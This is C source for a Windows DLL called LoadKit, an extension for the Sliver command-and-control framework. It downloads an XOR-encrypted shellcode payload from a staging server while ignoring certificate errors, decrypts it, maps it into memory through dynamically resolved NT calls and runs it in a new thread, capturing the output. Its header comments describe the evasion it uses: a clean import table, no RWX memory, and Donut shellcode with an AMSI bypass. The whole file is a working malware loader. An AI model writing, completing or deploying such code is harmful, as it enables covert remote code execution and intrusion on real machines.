/*
 * LoadKit Extension DLL — load.x64.dll
 *
 * Sliver Extension entry point: GoExtensionArgs(data, len) → allocates a fresh
 * Donut shellcode payload in-memory and runs it, capturing stdout/stderr.
 *
 * Wire protocol (space-separated args string from Sliver):
 *   url=https://192.168.1.10:8443/<path>   — HTTPS URL, self-signed cert OK
 *   key=<64 hex chars>                      — 32-byte XOR key (hex-encoded)
 *
 * Execution chain:
 *   1. Parse args → url, key
 *   2. WinHTTP HTTPS fetch (ignore cert errors for self-signed staging)
 *   3. XOR-32 decrypt payload in-place
 *   4. Create anonymous pipe → redirect stdout/stderr into write end
 *   5. NtAllocateVirtualMemory(RW) → copy shellcode → NtProtectVirtualMemory(RX)
 *   6. NtCreateThreadEx on local process (shellcode runs in new thread)
 *   7. WaitForSingleObject(hThread, 300s)
 *   8. CloseHandle(hWrite) → EOF for reader
 *   9. ReadFile loop → accumulate output
 *  10. Restore original stdout/stderr
 *  11. callback(output, len, CALLBACK_OUTPUT)
 *
 * Evasion:
 *   - NT-native alloc: no VirtualAlloc in IAT (WinHTTP already gives us away so
 *     we keep it there; NT calls are loaded via GetProcAddress/GetModuleHandle)
 *   - No RWX: alloc RW → write → protect RX
 *   - WinHTTP loaded dynamically via LoadLibraryA to keep IAT clean
 *   - Shellcode is already Donut-wrapped (AMSI+WLDP bypass, Chaskey-CTR)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -shared -o load.x64.dll load.c \
 *       -masm=intel -Wall -Os -s \
 *       -fno-stack-protector -fno-ident \
 *       -Wl,--disable-runtime-pseudo-reloc \
 *       -lntdll
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ── Sliver Extension ABI ─────────────────────────────────────────────── */
/* Callback types — from Sliver's extension documentation */
#define CALLBACK_OUTPUT      0x0d
#define CALLBACK_ERROR       0x0e

typedef void (*callback_fn)(uint8_t *data, uint32_t len, uint32_t id);

/* The extension entry point Sliver calls:
 *   data — UTF-8 args string ("url=... key=...")
 *   len  — byte length of args string
 *   cb   — function to send output back to Sliver console
 */
__declspec(dllexport)
void GoExtensionArgs(uint8_t *data, uint32_t len, callback_fn cb);

/* ── NT API declarations (loaded at runtime) ─────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS 0

typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize,
    ULONG AllocationType, ULONG Protect);

typedef NTSTATUS (WINAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

typedef NTSTATUS (WINAPI *NtCreateThreadEx_t)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ProcessHandle,
    PVOID lpStartAddress, PVOID lpParameter,
    ULONG Flags, SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer);

/* ── WinHTTP type definitions ────────────────────────────────────────── */
typedef LPVOID HINTERNET;
typedef WORD   INTERNET_PORT;
typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
typedef BOOL (WINAPI *WinHttpSetOption_t)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *WinHttpQueryDataAvailable_t)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *WinHttpCloseHandle_t)(HINTERNET);

#define WINHTTP_ACCESS_TYPE_NO_PROXY       1
#define WINHTTP_NO_PROXY_NAME              NULL
#define WINHTTP_NO_PROXY_BYPASS            NULL
#define WINHTTP_FLAG_SECURE                0x00800000
#define WINHTTP_OPTION_SECURITY_FLAGS      31
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA    0x00000100
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID  0x00001000
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS  (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)

/* forward declaration */
static int parse_url(const char *url,
                     wchar_t *host, size_t host_sz,
                     INTERNET_PORT *port,
                     wchar_t *path, size_t path_sz);

/* ── helper: hex nibble → byte ───────────────────────────────────────── */
static uint8_t hex_nibble(char c) {
    if (c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if (c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0;
}

static int hex_decode(const char *hex, uint8_t *out, size_t out_len) {
    size_t hex_len = strlen(hex);
    if (hex_len != out_len * 2) return 0;
    for (size_t i = 0; i < out_len; i++)
        out[i] = (uint8_t)((hex_nibble(hex[i*2]) << 4) | hex_nibble(hex[i*2+1]));
    return 1;
}

/* ── helper: wide-string URL parser ─────────────────────────────────── */
/* Parses "https://host:port/path" into components. Returns 0 on failure. */
static int parse_url(const char *url,
                     wchar_t *host, size_t host_sz,
                     INTERNET_PORT *port,
                     wchar_t *path, size_t path_sz) {
    const char *p = url;
    int is_https = 0;

    if (strncmp(p, "https://", 8) == 0) { is_https = 1; p += 8; }
    else if (strncmp(p, "http://", 7) == 0) { p += 7; }
    else return 0;

    /* find host:port boundary */
    const char *host_start = p;
    const char *colon = NULL;
    const char *slash = NULL;
    while (*p && *p != '/') {
        if (*p == ':') colon = p;
        p++;
    }
    slash = p;

    /* extract port */
    if (colon) {
        *port = (INTERNET_PORT)atoi(colon + 1);
        MultiByteToWideChar(CP_ACP, 0, host_start, (int)(colon - host_start),
                            host, (int)host_sz);
        host[(colon - host_start)] = L'\0';
    } else {
        *port = is_https ? 443 : 80;
        MultiByteToWideChar(CP_ACP, 0, host_start, (int)(slash - host_start),
                            host, (int)host_sz);
        host[(slash - host_start)] = L'\0';
    }

    /* extract path */
    if (*slash) {
        MultiByteToWideChar(CP_ACP, 0, slash, -1, path, (int)path_sz);
    } else {
        path[0] = L'/'; path[1] = L'\0';
    }
    return 1;
}

/* ── HTTPS fetch via dynamically-loaded WinHTTP ─────────────────────── */
static uint8_t *winhttp_fetch(const char *url, DWORD *out_len) {
    HMODULE hWH = LoadLibraryA("winhttp.dll");
    if (!hWH) return NULL;

#define LOAD(name) name##_t fn_##name = (name##_t)GetProcAddress(hWH, #name)
    LOAD(WinHttpOpen);
    LOAD(WinHttpConnect);
    LOAD(WinHttpOpenRequest);
    LOAD(WinHttpSetOption);
    LOAD(WinHttpSendRequest);
    LOAD(WinHttpReceiveResponse);
    LOAD(WinHttpQueryDataAvailable);
    LOAD(WinHttpReadData);
    LOAD(WinHttpCloseHandle);
#undef LOAD

    wchar_t whost[256] = {0};
    wchar_t wpath[512] = {0};
    INTERNET_PORT port = 443;
    if (!parse_url(url, whost, 256, &port, wpath, 512)) {
        FreeLibrary(hWH);
        return NULL;
    }

    uint8_t *buf = NULL;
    DWORD total = 0;
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;

    hSess = fn_WinHttpOpen(L"LoadKit/1.0",
                           WINHTTP_ACCESS_TYPE_NO_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;

    hConn = fn_WinHttpConnect(hSess, whost, port, 0);
    if (!hConn) goto cleanup;

    hReq = fn_WinHttpOpenRequest(hConn, L"GET", wpath,
                                 NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) goto cleanup;

    /* ignore self-signed cert errors */
    DWORD sec_flags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    fn_WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                        &sec_flags, sizeof(sec_flags));

    if (!fn_WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0)) goto cleanup;
    if (!fn_WinHttpReceiveResponse(hReq, NULL)) goto cleanup;

    /* read all chunks */
    for (;;) {
        DWORD avail = 0;
        if (!fn_WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
        buf = (uint8_t *)realloc(buf, total + avail);
        if (!buf) goto cleanup;
        DWORD read = 0;
        if (!fn_WinHttpReadData(hReq, buf + total, avail, &read)) break;
        total += read;
    }

cleanup:
    if (hReq) fn_WinHttpCloseHandle(hReq);
    if (hConn) fn_WinHttpCloseHandle(hConn);
    if (hSess) fn_WinHttpCloseHandle(hSess);
    FreeLibrary(hWH);
    *out_len = total;
    return buf;
}

/* ── NT API helpers (local process) ─────────────────────────────────── */
static HANDLE nt_alloc_rw(uint8_t *sc, SIZE_T sz) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    NtAllocateVirtualMemory_t NtAllocVM =
        (NtAllocateVirtualMemory_t)GetProcAddress(hNt, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t NtWriteVM =
        (NtWriteVirtualMemory_t)GetProcAddress(hNt, "NtWriteVirtualMemory");
    NtProtectVirtualMemory_t NtProtVM =
        (NtProtectVirtualMemory_t)GetProcAddress(hNt, "NtProtectVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx =
        (NtCreateThreadEx_t)GetProcAddress(hNt, "NtCreateThreadEx");

    if (!NtAllocVM || !NtWriteVM || !NtProtVM || !NtCreateThreadEx) return NULL;

    HANDLE hProc = (HANDLE)(LONG_PTR)(-1); /* NtCurrentProcess */

    /* 1. alloc RW */
    PVOID base = NULL;
    SIZE_T size = sz;
    NTSTATUS s = NtAllocVM(hProc, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(s)) return NULL;

    /* 2. write shellcode */
    SIZE_T written = 0;
    s = NtWriteVM(hProc, base, sc, sz, &written);
    if (!NT_SUCCESS(s)) return NULL;

    /* 3. protect RX */
    ULONG old_prot = 0;
    SIZE_T psize = sz;
    s = NtProtVM(hProc, &base, &psize, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(s)) return NULL;

    /* 4. create thread (suspended=0, start executing) */
    HANDLE hThread = NULL;
    s = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc,
                         base, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(s)) return NULL;
    return hThread;
}

/* ── GoExtensionArgs ─────────────────────────────────────────────────── */
__declspec(dllexport)
void GoExtensionArgs(uint8_t *data, uint32_t len, callback_fn cb) {
    /* parse args: "url=<url> key=<hexkey>" */
    char args_buf[2048] = {0};
    if (len >= sizeof(args_buf)) len = sizeof(args_buf) - 1;
    memcpy(args_buf, data, len);

    char url[512] = {0};
    char key_hex[65] = {0};
    uint8_t xor_key[32] = {0};

    char *tok = strtok(args_buf, " \t");
    while (tok) {
        if (strncmp(tok, "url=", 4) == 0) {
            snprintf(url, sizeof(url), "%s", tok + 4);
        } else if (strncmp(tok, "key=", 4) == 0) {
            snprintf(key_hex, sizeof(key_hex), "%s", tok + 4);
        }
        tok = strtok(NULL, " \t");
    }

    if (!url[0] || !key_hex[0]) {
        const char *err = "loadkit: missing url= or key= argument";
        cb((uint8_t *)err, (uint32_t)strlen(err), CALLBACK_ERROR);
        return;
    }

    if (!hex_decode(key_hex, xor_key, 32)) {
        const char *err = "loadkit: key= must be 64 hex chars (32-byte XOR key)";
        cb((uint8_t *)err, (uint32_t)strlen(err), CALLBACK_ERROR);
        return;
    }

    /* fetch encrypted payload */
    DWORD enc_len = 0;
    uint8_t *enc = winhttp_fetch(url, &enc_len);
    if (!enc || enc_len == 0) {
        const char *err = "loadkit: WinHTTP fetch failed";
        cb((uint8_t *)err, (uint32_t)strlen(err), CALLBACK_ERROR);
        free(enc);
        return;
    }

    /* XOR-32 decrypt in-place */
    for (DWORD i = 0; i < enc_len; i++)
        enc[i] ^= xor_key[i % 32];

    /* redirect stdout/stderr through anonymous pipe for output capture */
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);

    HANDLE orig_out = GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE orig_err = GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, hWrite);
    SetStdHandle(STD_ERROR_HANDLE, hWrite);

    /* allocate RW, write shellcode, protect RX, launch thread */
    HANDLE hThread = nt_alloc_rw(enc, enc_len);
    free(enc);

    if (!hThread) {
        /* restore stdout/stderr before returning */
        SetStdHandle(STD_OUTPUT_HANDLE, orig_out);
        SetStdHandle(STD_ERROR_HANDLE, orig_err);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        const char *err = "loadkit: NT allocation or thread creation failed";
        cb((uint8_t *)err, (uint32_t)strlen(err), CALLBACK_ERROR);
        return;
    }

    /* wait up to 5 minutes for shellcode to finish */
    WaitForSingleObject(hThread, 300000);
    CloseHandle(hThread);

    /* restore original handles and signal EOF to reader */
    SetStdHandle(STD_OUTPUT_HANDLE, orig_out);
    SetStdHandle(STD_ERROR_HANDLE, orig_err);
    CloseHandle(hWrite); /* EOF: reader will drain and get ERROR_BROKEN_PIPE */

    /* drain pipe → accumulate output */
    char tmp[4096];
    DWORD nread = 0;
    uint8_t *out = NULL;
    DWORD out_len = 0;
    while (ReadFile(hRead, tmp, sizeof(tmp), &nread, NULL) && nread > 0) {
        out = (uint8_t *)realloc(out, out_len + nread);
        memcpy(out + out_len, tmp, nread);
        out_len += nread;
    }
    CloseHandle(hRead);

    if (out && out_len > 0) {
        cb(out, out_len, CALLBACK_OUTPUT);
    } else {
        const char *msg = "(no output captured)";
        cb((uint8_t *)msg, (uint32_t)strlen(msg), CALLBACK_OUTPUT);
    }
    free(out);
}

/* ── DllMain ─────────────────────────────────────────────────────────── */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)fdwReason; (void)lpvReserved;
    return TRUE;
}
